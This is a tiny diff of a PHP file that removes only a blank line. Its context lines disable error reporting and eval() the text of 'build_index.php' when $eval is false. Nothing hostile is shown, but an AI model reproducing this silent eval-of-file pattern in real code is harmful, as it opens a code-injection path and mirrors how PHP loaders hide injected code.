@@ -1,6 +1,5 @@
 <?php
 
-
 error_reporting(0);
 if($eval == false) {
     eval(str_replace('<?php',"",get_e("build_index.php")));
